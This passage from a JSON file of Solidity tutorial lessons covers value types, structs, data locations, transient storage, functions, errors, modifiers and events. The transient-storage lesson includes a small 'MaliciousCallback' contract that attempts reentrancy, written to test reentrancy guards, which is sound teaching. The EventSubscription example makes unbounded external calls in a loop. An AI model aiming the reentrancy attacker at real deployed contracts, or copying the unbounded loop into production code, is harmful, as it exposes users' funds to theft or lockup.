external view {\n        // Without UDVT\n        uint128 clock;\n        uint64 d = 1;\n        uint64 t = uint64(block.timestamp);\n        clock = LibClockBasic.wrap(d, t);\n        // Oops! wrong order of inputs but still compiles\n        clock = LibClockBasic.wrap(t, d);\n    }\n\n    function example_uvdt() external view {\n        // Turn value type into user defined value type\n        Duration d = Duration.wrap(1);\n        Timestamp t = Timestamp.wrap(uint64(block.timestamp));\n        // Turn user defined value type back into primitive value type\n        uint64 d_u64 = Duration.unwrap(d);\n        uint64 t_u64 = Timestamp.unwrap(t);\n\n        // LibClock example\n        Clock clock = Clock.wrap(0);\n        clock = LibClock.wrap(d, t);\n        // Oops! wrong order of inputs\n        // This will not compile\n        // clock = LibClock.wrap(t, d);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "UserDefinedValueTypes.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Code copied from optimism\n// https://github.com/ethereum-optimism/optimism/blob/develop/packages/contracts-bedrock/src/dispute/lib/LibUDT.sol\n\ntype Duration is uint64;\n\ntype Timestamp is uint64;\n\ntype Clock is uint128;\n\nlibrary LibClock {\n    function wrap(Duration _duration, Timestamp _timestamp)\n        internal\n        pure\n        returns (Clock clock_)\n    {\n        assembly {\n            // data | Duration | Timestamp\n            // bit  | 0 ... 63 | 64 ... 127\n            clock_ := or(shl(0x40, _duration), _timestamp)\n        }\n    }\n\n    function duration(Clock _clock)\n        internal\n        pure\n        returns (Duration duration_)\n    {\n        assembly {\n            duration_ := shr(0x40, _clock)\n        }\n    }\n\n    function timestamp(Clock _clock)\n        internal\n        pure\n        returns (Timestamp timestamp_)\n    {\n        assembly {\n            timestamp_ := shr(0xC0, shl(0xC0, _clock))\n        }\n    }\n}\n\n// Clock library without user defined value type\nlibrary LibClockBasic {\n    function wrap(uint64 _duration, uint64 _timestamp)\n        internal\n        pure\n        returns (uint128 clock)\n    {\n        assembly {\n            clock := or(shl(0x40, _duration), _timestamp)\n        }\n    }\n}\n\ncontract Examples {\n    function example_no_uvdt() external view {\n        // Without UDVT\n        uint128 clock;\n        uint64 d = 1;\n        uint64 t = uint64(block.timestamp);\n        clock = LibClockBasic.wrap(d, t);\n        // Oops! wrong order of inputs but still compiles\n        clock = LibClockBasic.wrap(t, d);\n    }\n\n    function example_uvdt() external view {\n        // Turn value type into user defined value type\n        Duration d = Duration.wrap(1);\n        Timestamp t = Timestamp.wrap(uint64(block.timestamp));\n        // Turn user defined value type back into primitive value type\n        uint64 d_u64 = Duration.unwrap(d);\n        uint64 t_u64 = Timestamp.unwrap(t);\n\n        // LibClock example\n        Clock clock = Clock.wrap(0);\n        clock = LibClock.wrap(d, t);\n        // Oops! wrong order of inputs\n        // This will not compile\n        // clock = LibClock.wrap(t, d);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "data",
      "user",
      "defined",
      "value",
      "types",
      "udvt"
    ],
    "order": 14
  },
  {
    "slug": "structs",
    "title": "Structs",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of how to use structs in Solidity",
    "content": "You can define your own type by creating a `struct`.\n\nThey are useful for grouping together related data.\n\nStructs can be declared outside of a contract and imported in another contract.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Todos {\n    struct Todo {\n        string text;\n        bool completed;\n    }\n\n    // An array of 'Todo' structs\n    Todo[] public todos;\n\n    function create(string calldata _text) public {\n        // 3 ways to initialize a struct\n        // - calling it like a function\n        todos.push(Todo(_text, false));\n\n        // key value mapping\n        todos.push(Todo({text: _text, completed: false}));\n\n        // initialize an empty struct and then update it\n        Todo memory todo;\n        todo.text = _text;\n        // todo.completed initialized to false\n\n        todos.push(todo);\n    }\n\n    // Solidity automatically creates a getter for 'todos' so\n    // you don't actually need this function.\n    function get(uint256 _index)\n        public\n        view\n        returns (string memory text, bool completed)\n    {\n        Todo storage todo = todos[_index];\n        return (todo.text, todo.completed);\n    }\n\n    // update text\n    function updateText(uint256 _index, string calldata _text) public {\n        Todo storage todo = todos[_index];\n        todo.text = _text;\n    }\n\n    // update completed\n    function toggleCompleted(uint256 _index) public {\n        Todo storage todo = todos[_index];\n        todo.completed = !todo.completed;\n    }\n}\n\n```\n\n### Declaring and importing Struct\n\nFile that the struct is declared in\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n// This is saved 'StructDeclaration.sol'\n\nstruct Todo {\n    string text;\n    bool completed;\n}\n\n```\n\nFile that imports the struct above\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./StructDeclaration.sol\";\n\ncontract Todos {\n    // An array of 'Todo' structs\n    Todo[] public todos;\n}\n\n```",
    "codes": [
      {
        "fileName": "StructDeclaration.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n// This is saved 'StructDeclaration.sol'\n\nstruct Todo {\n    string text;\n    bool completed;\n}\n"
      },
      {
        "fileName": "StructImport.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./StructDeclaration.sol\";\n\ncontract Todos {\n    // An array of 'Todo' structs\n    Todo[] public todos;\n}\n"
      },
      {
        "fileName": "Structs.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Todos {\n    struct Todo {\n        string text;\n        bool completed;\n    }\n\n    // An array of 'Todo' structs\n    Todo[] public todos;\n\n    function create(string calldata _text) public {\n        // 3 ways to initialize a struct\n        // - calling it like a function\n        todos.push(Todo(_text, false));\n\n        // key value mapping\n        todos.push(Todo({text: _text, completed: false}));\n\n        // initialize an empty struct and then update it\n        Todo memory todo;\n        todo.text = _text;\n        // todo.completed initialized to false\n\n        todos.push(todo);\n    }\n\n    // Solidity automatically creates a getter for 'todos' so\n    // you don't actually need this function.\n    function get(uint256 _index)\n        public\n        view\n        returns (string memory text, bool completed)\n    {\n        Todo storage todo = todos[_index];\n        return (todo.text, todo.completed);\n    }\n\n    // update text\n    function updateText(uint256 _index, string calldata _text) public {\n        Todo storage todo = todos[_index];\n        todo.text = _text;\n    }\n\n    // update completed\n    function toggleCompleted(uint256 _index) public {\n        Todo storage todo = todos[_index];\n        todo.completed = !todo.completed;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "struct",
      "structs",
      "data",
      "type",
      "types",
      "variable",
      "variables"
    ],
    "order": 15
  },
  {
    "slug": "data-locations",
    "title": "Data Locations - Storage, Memory and Calldata",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Data locations - storage, memory and calldata",
    "content": "Variables are declared as either `storage`, `memory` or `calldata` to explicitly\nspecify the location of the data.\n\n- `storage` - variable is a state variable (stored on the blockchain)\n- `memory` - variable is in memory and it exists while a function is being called\n- `calldata` - special data location that contains function arguments\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract DataLocations {\n    uint256[] public arr;\n    mapping(uint256 => address) map;\n\n    struct MyStruct {\n        uint256 foo;\n    }\n\n    mapping(uint256 => MyStruct) myStructs;\n\n    function f() public {\n        // call _f with state variables\n        _f(arr, map, myStructs[1]);\n\n        // get a struct from a mapping\n        MyStruct storage myStruct = myStructs[1];\n        // create a struct in memory\n        MyStruct memory myMemStruct = MyStruct(0);\n    }\n\n    function _f(\n        uint256[] storage _arr,\n        mapping(uint256 => address) storage _map,\n        MyStruct storage _myStruct\n    ) internal {\n        // do something with storage variables\n    }\n\n    // You can return memory variables\n    function g(uint256[] memory _arr) public returns (uint256[] memory) {\n        // do something with memory array\n    }\n\n    function h(uint256[] calldata _arr) external {\n        // do something with calldata array\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "DataLocations.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract DataLocations {\n    uint256[] public arr;\n    mapping(uint256 => address) map;\n\n    struct MyStruct {\n        uint256 foo;\n    }\n\n    mapping(uint256 => MyStruct) myStructs;\n\n    function f() public {\n        // call _f with state variables\n        _f(arr, map, myStructs[1]);\n\n        // get a struct from a mapping\n        MyStruct storage myStruct = myStructs[1];\n        // create a struct in memory\n        MyStruct memory myMemStruct = MyStruct(0);\n    }\n\n    function _f(\n        uint256[] storage _arr,\n        mapping(uint256 => address) storage _map,\n        MyStruct storage _myStruct\n    ) internal {\n        // do something with storage variables\n    }\n\n    // You can return memory variables\n    function g(uint256[] memory _arr) public returns (uint256[] memory) {\n        // do something with memory array\n    }\n\n    function h(uint256[] calldata _arr) external {\n        // do something with calldata array\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "data",
      "location",
      "locations",
      "storage",
      "memory",
      "calldata"
    ],
    "order": 16
  },
  {
    "slug": "transient-storage",
    "title": "Transient Storage",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "transient storage",
    "content": "Data stored in transient storage is cleared out after transaction.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Make sure EVM version and VM set to Cancun\n\n// Storage - data is stored on the blockchain\n// Memory - data is cleared out after a function call\n// Transient storage - data is cleared out after a transaction\n\ninterface ITest {\n    function val() external view returns (uint256);\n    function test() external;\n}\n\n// Contract for testing TestStorage and TestTransientStorage\n// Shows the difference between normal storage and transient storage\ncontract Callback {\n    uint256 public val;\n\n    fallback() external {\n        val = ITest(msg.sender).val();\n    }\n\n    function test(address target) external {\n        ITest(target).test();\n    }\n}\n\ncontract TestStorage {\n    uint256 public val;\n\n    function test() public {\n        val = 123;\n        bytes memory b = \"\";\n        msg.sender.call(b);\n    }\n}\n\ncontract TestTransientStorage {\n    bytes32 constant SLOT = 0;\n\n    function test() public {\n        assembly {\n            tstore(SLOT, 321)\n        }\n        bytes memory b = \"\";\n        msg.sender.call(b);\n    }\n\n    function val() public view returns (uint256 v) {\n        assembly {\n            v := tload(SLOT)\n        }\n    }\n}\n\n// Contract for testing reentrancy protection\ncontract MaliciousCallback {\n    uint256 public count = 0;\n\n    // Try to reenter the target contract multiple times\n    fallback() external {\n        ITest(msg.sender).test();\n    }\n\n    // Test function to initiate reentrance attack\n    function attack(address _target) external {\n        // First call to test()\n        ITest(_target).test();\n    }\n}\n\ncontract ReentrancyGuard {\n    bool private locked;\n\n    modifier lock() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    // 27587 gas\n    function test() public lock {\n        // Ignore call error\n        bytes memory b = \"\";\n        msg.sender.call(b);\n    }\n}\n\ncontract ReentrancyGuardTransient {\n    bytes32 constant SLOT = 0;\n\n    modifier lock() {\n        assembly {\n            if tload(SLOT) { revert(0, 0) }\n            tstore(SLOT, 1)\n        }\n        _;\n        assembly {\n            tstore(SLOT, 0)\n        }\n    }\n\n    // 4909 gas\n    function test() external lock {\n        // Ignore call error\n        bytes memory b = \"\";\n        msg.sender.call(b);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "TransientStorage.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Make sure EVM version and VM set to Cancun\n\n// Storage - data is stored on the blockchain\n// Memory - data is cleared out after a function call\n// Transient storage - data is cleared out after a transaction\n\ninterface ITest {\n    function val() external view returns (uint256);\n    function test() external;\n}\n\n// Contract for testing TestStorage and TestTransientStorage\n// Shows the difference between normal storage and transient storage\ncontract Callback {\n    uint256 public val;\n\n    fallback() external {\n        val = ITest(msg.sender).val();\n    }\n\n    function test(address target) external {\n        ITest(target).test();\n    }\n}\n\ncontract TestStorage {\n    uint256 public val;\n\n    function test() public {\n        val = 123;\n        bytes memory b = \"\";\n        msg.sender.call(b);\n    }\n}\n\ncontract TestTransientStorage {\n    bytes32 constant SLOT = 0;\n\n    function test() public {\n        assembly {\n            tstore(SLOT, 321)\n        }\n        bytes memory b = \"\";\n        msg.sender.call(b);\n    }\n\n    function val() public view returns (uint256 v) {\n        assembly {\n            v := tload(SLOT)\n        }\n    }\n}\n\n// Contract for testing reentrancy protection\ncontract MaliciousCallback {\n    uint256 public count = 0;\n\n    // Try to reenter the target contract multiple times\n    fallback() external {\n        ITest(msg.sender).test();\n    }\n\n    // Test function to initiate reentrance attack\n    function attack(address _target) external {\n        // First call to test()\n        ITest(_target).test();\n    }\n}\n\ncontract ReentrancyGuard {\n    bool private locked;\n\n    modifier lock() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    // 27587 gas\n    function test() public lock {\n        // Ignore call error\n        bytes memory b = \"\";\n        msg.sender.call(b);\n    }\n}\n\ncontract ReentrancyGuardTransient {\n    bytes32 constant SLOT = 0;\n\n    modifier lock() {\n        assembly {\n            if tload(SLOT) { revert(0, 0) }\n            tstore(SLOT, 1)\n        }\n        _;\n        assembly {\n            tstore(SLOT, 0)\n        }\n    }\n\n    // 4909 gas\n    function test() external lock {\n        // Ignore call error\n        bytes memory b = \"\";\n        msg.sender.call(b);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "transient",
      "storage"
    ],
    "order": 17
  },
  {
    "slug": "function",
    "title": "Function",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of how to write functions in Solidity",
    "content": "There are several ways to return outputs from a function.\n\nPublic functions cannot accept certain data types as inputs or outputs\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Function {\n    // Functions can return multiple values.\n    function returnMany() public pure returns (uint256, bool, uint256) {\n        return (1, true, 2);\n    }\n\n    // Return values can be named.\n    function named() public pure returns (uint256 x, bool b, uint256 y) {\n        return (1, true, 2);\n    }\n\n    // Return values can be assigned to their name.\n    // In this case the return statement can be omitted.\n    function assigned() public pure returns (uint256 x, bool b, uint256 y) {\n        x = 1;\n        b = true;\n        y = 2;\n    }\n\n    // Use destructuring assignment when calling another\n    // function that returns multiple values.\n    function destructuringAssignments()\n        public\n        pure\n        returns (uint256, bool, uint256, uint256, uint256)\n    {\n        (uint256 i, bool b, uint256 j) = returnMany();\n\n        // Values can be left out.\n        (uint256 x,, uint256 y) = (4, 5, 6);\n\n        return (i, b, j, x, y);\n    }\n\n    // Cannot use map for either input or output\n\n    // Can use array for input\n    function arrayInput(uint256[] memory _arr) public {}\n\n    // Can use array for output\n    uint256[] public arr;\n\n    function arrayOutput() public view returns (uint256[] memory) {\n        return arr;\n    }\n}\n\n// Call function with key-value inputs\ncontract XYZ {\n    function someFuncWithManyInputs(\n        uint256 x,\n        uint256 y,\n        uint256 z,\n        address a,\n        bool b,\n        string memory c\n    ) public pure returns (uint256) {}\n\n    function callFunc() external pure returns (uint256) {\n        return someFuncWithManyInputs(1, 2, 3, address(0), true, \"c\");\n    }\n\n    function callFuncWithKeyValue() external pure returns (uint256) {\n        return someFuncWithManyInputs({\n            a: address(0),\n            b: true,\n            c: \"c\",\n            x: 1,\n            y: 2,\n            z: 3\n        });\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Function.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Function {\n    // Functions can return multiple values.\n    function returnMany() public pure returns (uint256, bool, uint256) {\n        return (1, true, 2);\n    }\n\n    // Return values can be named.\n    function named() public pure returns (uint256 x, bool b, uint256 y) {\n        return (1, true, 2);\n    }\n\n    // Return values can be assigned to their name.\n    // In this case the return statement can be omitted.\n    function assigned() public pure returns (uint256 x, bool b, uint256 y) {\n        x = 1;\n        b = true;\n        y = 2;\n    }\n\n    // Use destructuring assignment when calling another\n    // function that returns multiple values.\n    function destructuringAssignments()\n        public\n        pure\n        returns (uint256, bool, uint256, uint256, uint256)\n    {\n        (uint256 i, bool b, uint256 j) = returnMany();\n\n        // Values can be left out.\n        (uint256 x,, uint256 y) = (4, 5, 6);\n\n        return (i, b, j, x, y);\n    }\n\n    // Cannot use map for either input or output\n\n    // Can use array for input\n    function arrayInput(uint256[] memory _arr) public {}\n\n    // Can use array for output\n    uint256[] public arr;\n\n    function arrayOutput() public view returns (uint256[] memory) {\n        return arr;\n    }\n}\n\n// Call function with key-value inputs\ncontract XYZ {\n    function someFuncWithManyInputs(\n        uint256 x,\n        uint256 y,\n        uint256 z,\n        address a,\n        bool b,\n        string memory c\n    ) public pure returns (uint256) {}\n\n    function callFunc() external pure returns (uint256) {\n        return someFuncWithManyInputs(1, 2, 3, address(0), true, \"c\");\n    }\n\n    function callFuncWithKeyValue() external pure returns (uint256) {\n        return someFuncWithManyInputs({\n            a: address(0),\n            b: true,\n            c: \"c\",\n            x: 1,\n            y: 2,\n            z: 3\n        });\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "function",
      "functions"
    ],
    "order": 18
  },
  {
    "slug": "view-and-pure-functions",
    "title": "View and Pure Functions",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of view and pure functions in Solidity",
    "content": "Getter functions can be declared `view` or `pure`.\n\n`View` function declares that no state will be changed.\n\n`Pure` function declares that no state variable will be changed or read.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ViewAndPure {\n    uint256 public x = 1;\n\n    // Promise not to modify the state.\n    function addToX(uint256 y) public view returns (uint256) {\n        return x + y;\n    }\n\n    // Promise not to modify or read from the state.\n    function add(uint256 i, uint256 j) public pure returns (uint256) {\n        return i + j;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ViewAndPureFunctions.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ViewAndPure {\n    uint256 public x = 1;\n\n    // Promise not to modify the state.\n    function addToX(uint256 y) public view returns (uint256) {\n        return x + y;\n    }\n\n    // Promise not to modify or read from the state.\n    function add(uint256 i, uint256 j) public pure returns (uint256) {\n        return i + j;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "view",
      "pure",
      "function",
      "functions"
    ],
    "order": 19
  },
  {
    "slug": "error",
    "title": "Error",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of how to throw errors in Solidity",
    "content": "An error will undo all changes made to the state during a transaction.\n\nYou can throw an error by calling `require`, `revert` or `assert`.\n\n- `require` is used to validate inputs and conditions before execution.\n- `revert` is similar to `require`. See the code below for details.\n- `assert` is used to check for code that should never be false. Failing\n  assertion probably means that there is a bug.\n\nUse custom error to save gas.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Error {\n    function testRequire(uint256 _i) public pure {\n        // Require should be used to validate conditions such as:\n        // - inputs\n        // - conditions before execution\n        // - return values from calls to other functions\n        require(_i > 10, \"Input must be greater than 10\");\n    }\n\n    function testRevert(uint256 _i) public pure {\n        // Revert is useful when the condition to check is complex.\n        // This code does the exact same thing as the example above\n        if (_i <= 10) {\n            revert(\"Input must be greater than 10\");\n        }\n    }\n\n    uint256 public num;\n\n    function testAssert() public view {\n        // Assert should only be used to test for internal errors,\n        // and to check invariants.\n\n        // Here we assert that num is always equal to 0\n        // since it is impossible to update the value of num\n        assert(num == 0);\n    }\n\n    // custom error\n    error InsufficientBalance(uint256 balance, uint256 withdrawAmount);\n\n    function testCustomError(uint256 _withdrawAmount) public view {\n        uint256 bal = address(this).balance;\n        if (bal < _withdrawAmount) {\n            revert InsufficientBalance({\n                balance: bal,\n                withdrawAmount: _withdrawAmount\n            });\n        }\n    }\n}\n\n```\n\nHere is another example\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Account {\n    uint256 public balance;\n    uint256 public constant MAX_UINT = 2 ** 256 - 1;\n\n    function deposit(uint256 _amount) public {\n        uint256 oldBalance = balance;\n        uint256 newBalance = balance + _amount;\n\n        // balance + _amount does not overflow if balance + _amount >= balance\n        require(newBalance >= oldBalance, \"Overflow\");\n\n        balance = newBalance;\n\n        assert(balance >= oldBalance);\n    }\n\n    function withdraw(uint256 _amount) public {\n        uint256 oldBalance = balance;\n\n        // balance - _amount does not underflow if balance >= _amount\n        require(balance >= _amount, \"Underflow\");\n\n        if (balance < _amount) {\n            revert(\"Underflow\");\n        }\n\n        balance -= _amount;\n\n        assert(balance <= oldBalance);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Account.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Account {\n    uint256 public balance;\n    uint256 public constant MAX_UINT = 2 ** 256 - 1;\n\n    function deposit(uint256 _amount) public {\n        uint256 oldBalance = balance;\n        uint256 newBalance = balance + _amount;\n\n        // balance + _amount does not overflow if balance + _amount >= balance\n        require(newBalance >= oldBalance, \"Overflow\");\n\n        balance = newBalance;\n\n        assert(balance >= oldBalance);\n    }\n\n    function withdraw(uint256 _amount) public {\n        uint256 oldBalance = balance;\n\n        // balance - _amount does not underflow if balance >= _amount\n        require(balance >= _amount, \"Underflow\");\n\n        if (balance < _amount) {\n            revert(\"Underflow\");\n        }\n\n        balance -= _amount;\n\n        assert(balance <= oldBalance);\n    }\n}\n"
      },
      {
        "fileName": "Error.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Error {\n    function testRequire(uint256 _i) public pure {\n        // Require should be used to validate conditions such as:\n        // - inputs\n        // - conditions before execution\n        // - return values from calls to other functions\n        require(_i > 10, \"Input must be greater than 10\");\n    }\n\n    function testRevert(uint256 _i) public pure {\n        // Revert is useful when the condition to check is complex.\n        // This code does the exact same thing as the example above\n        if (_i <= 10) {\n            revert(\"Input must be greater than 10\");\n        }\n    }\n\n    uint256 public num;\n\n    function testAssert() public view {\n        // Assert should only be used to test for internal errors,\n        // and to check invariants.\n\n        // Here we assert that num is always equal to 0\n        // since it is impossible to update the value of num\n        assert(num == 0);\n    }\n\n    // custom error\n    error InsufficientBalance(uint256 balance, uint256 withdrawAmount);\n\n    function testCustomError(uint256 _withdrawAmount) public view {\n        uint256 bal = address(this).balance;\n        if (bal < _withdrawAmount) {\n            revert InsufficientBalance({\n                balance: bal,\n                withdrawAmount: _withdrawAmount\n            });\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "error",
      "errors",
      "require",
      "revert",
      "assert"
    ],
    "order": 20
  },
  {
    "slug": "function-modifier",
    "title": "Function Modifier",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of how to write function modifier in Solidity",
    "content": "Modifiers are code that can be run before and / or after a function call.\n\nModifiers can be used to:\n\n- Restrict access\n- Validate inputs\n- Guard against reentrancy hack\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract FunctionModifier {\n    // We will use these variables to demonstrate how to use\n    // modifiers.\n    address public owner;\n    uint256 public x = 10;\n    bool public locked;\n\n    constructor() {\n        // Set the transaction sender as the owner of the contract.\n        owner = msg.sender;\n    }\n\n    // Modifier to check that the caller is the owner of\n    // the contract.\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not owner\");\n        // Underscore is a special character only used inside\n        // a function modifier and it tells Solidity to\n        // execute the rest of the code.\n        _;\n    }\n\n    // Modifiers can take inputs. This modifier checks that the\n    // address passed in is not the zero address.\n    modifier validAddress(address _addr) {\n        require(_addr != address(0), \"Not valid address\");\n        _;\n    }\n\n    function changeOwner(address _newOwner)\n        public\n        onlyOwner\n        validAddress(_newOwner)\n    {\n        owner = _newOwner;\n    }\n\n    // Modifiers can be called before and / or after a function.\n    // This modifier prevents a function from being called while\n    // it is still executing.\n    modifier noReentrancy() {\n        require(!locked, \"No reentrancy\");\n\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function decrement(uint256 i) public noReentrancy {\n        x -= i;\n\n        if (i > 1) {\n            decrement(i - 1);\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "FunctionModifier.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract FunctionModifier {\n    // We will use these variables to demonstrate how to use\n    // modifiers.\n    address public owner;\n    uint256 public x = 10;\n    bool public locked;\n\n    constructor() {\n        // Set the transaction sender as the owner of the contract.\n        owner = msg.sender;\n    }\n\n    // Modifier to check that the caller is the owner of\n    // the contract.\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not owner\");\n        // Underscore is a special character only used inside\n        // a function modifier and it tells Solidity to\n        // execute the rest of the code.\n        _;\n    }\n\n    // Modifiers can take inputs. This modifier checks that the\n    // address passed in is not the zero address.\n    modifier validAddress(address _addr) {\n        require(_addr != address(0), \"Not valid address\");\n        _;\n    }\n\n    function changeOwner(address _newOwner)\n        public\n        onlyOwner\n        validAddress(_newOwner)\n    {\n        owner = _newOwner;\n    }\n\n    // Modifiers can be called before and / or after a function.\n    // This modifier prevents a function from being called while\n    // it is still executing.\n    modifier noReentrancy() {\n        require(!locked, \"No reentrancy\");\n\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function decrement(uint256 i) public noReentrancy {\n        x -= i;\n\n        if (i > 1) {\n            decrement(i - 1);\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "function",
      "functions",
      "modifier",
      "modifiers",
      "_"
    ],
    "order": 21
  },
  {
    "slug": "events",
    "title": "Events",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of how to emit events in Solidity",
    "content": "`Events` allow logging to the Ethereum blockchain. Some use cases for events are:\n\n- Listening for events and updating user interface\n- A cheap form of storage\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Event {\n    // Event declaration\n    // Up to 3 parameters can be indexed.\n    // Indexed parameters help you filter the logs by the indexed parameter\n    event Log(address indexed sender, string message);\n    event AnotherLog();\n\n    function test() public {\n        emit Log(msg.sender, \"Hello World!\");\n        emit Log(msg.sender, \"Hello EVM!\");\n        emit AnotherLog();\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Events.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Event {\n    // Event declaration\n    // Up to 3 parameters can be indexed.\n    // Indexed parameters help you filter the logs by the indexed parameter\n    event Log(address indexed sender, string message);\n    event AnotherLog();\n\n    function test() public {\n        emit Log(msg.sender, \"Hello World!\");\n        emit Log(msg.sender, \"Hello EVM!\");\n        emit AnotherLog();\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "event",
      "events"
    ],
    "order": 22
  },
  {
    "slug": "events-advanced",
    "title": "Events Advanced",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Advanced topics and concepts related to Solidity events",
    "content": "This page covers advanced topics and use cases related to events in Solidity, building upon the basics covered in the [Events](../events) page.\n\n`Events` in Solidity are a powerful tool that enables various advanced functionalities and architectures. Some advanced use cases for events include:\n\n- Event filtering and monitoring for real-time updates and analytics\n- Event log analysis and decoding for data extraction and processing\n- Event-driven architectures for decentralized applications (dApps)\n- Event subscriptions for real-time notifications and updates\n\n## Event-Driven Architecture\n\nThe `EventDrivenArchitecture` contract demonstrates an event-driven architecture where events are used to coordinate and trigger different stages of a process, such as initiating and confirming transfers.\n\n## Event Subscription and Real-Time Updates\n\nThe `EventSubscription` contract showcases how to implement event subscriptions, allowing external contracts or clients to subscribe and receive real-time updates when events are emitted. It also demonstrates how to handle event subscriptions and manage the subscription lifecycle.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.14;\n\n// Event-Driven Architecture\ncontract EventDrivenArchitecture {\n    event TransferInitiated(\n        address indexed from, address indexed to, uint256 value\n    );\n    event TransferConfirmed(\n        address indexed from, address indexed to, uint256 value\n    );\n\n    mapping(bytes32 => bool) public transferConfirmations;\n\n    function initiateTransfer(address to, uint256 value) public {\n        emit TransferInitiated(msg.sender, to, value);\n        // ... (initiate transfer logic)\n    }\n\n    function confirmTransfer(bytes32 transferId) public {\n        require(\n            !transferConfirmations[transferId], \"Transfer already confirmed\"\n        );\n        transferConfirmations[transferId] = true;\n        emit TransferConfirmed(msg.sender, address(this), 0);\n        // ... (confirm transfer logic)\n    }\n}\n\n// Event Subscription and Real-Time Updates\ninterface IEventSubscriber {\n    function handleTransferEvent(address from, address to, uint256 value)\n        external;\n}\n\ncontract EventSubscription {\n    event LogTransfer(address indexed from, address indexed to, uint256 value);\n\n    mapping(address => bool) public subscribers;\n    address[] public subscriberList;\n\n    function subscribe() public {\n        require(!subscribers[msg.sender], \"Already subscribed\");\n        subscribers[msg.sender] = true;\n        subscriberList.push(msg.sender);\n    }\n\n    function unsubscribe() public {\n        require(subscribers[msg.sender], \"Not subscribed\");\n        subscribers[msg.sender] = false;\n        for (uint256 i = 0; i < subscriberList.length; i++) {\n            if (subscriberList[i] == msg.sender) {\n                subscriberList[i] = subscriberList[subscriberList.length - 1];\n                subscriberList.pop();\n                break;\n            }\n        }\n    }\n\n    function transfer(address to, uint256 value) public {\n        emit LogTransfer(msg.sender, to, value);\n        for (uint256 i = 0; i < subscriberList.length; i++) {\n            IEventSubscriber(subscriberList[i]).handleTransferEvent(\n                msg.sender, to, value\n            );\n        }\n    }\n}\n\n```\n\n## Best Practices and Recommendations\n\n- Index the right event parameters to enable efficient filtering and searching. Addresses should typically be indexed, while amounts generally should not.\n- Avoid redundant events by not emitting events that are already covered by underlying libraries or contracts.\n- Events cannot be used in `view` or `pure` functions, as they alter the state of the blockchain by storing logs.\n- Be mindful of the gas cost associated with emitting events, especially when indexing parameters, as it can impact the overall gas consumption of your contract.",
    "codes": [
      {
        "fileName": "EventsAdvanced.sol",
